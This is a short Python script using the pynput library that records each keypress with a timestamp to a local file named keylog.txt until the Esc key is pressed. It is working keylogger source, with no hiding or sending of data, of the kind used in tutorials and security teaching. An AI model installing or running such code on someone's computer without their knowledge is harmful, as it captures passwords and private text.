import pynput
from pynput.keyboard import Key, Listener
import datetime

def on_press(key):
    with open('keylog.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()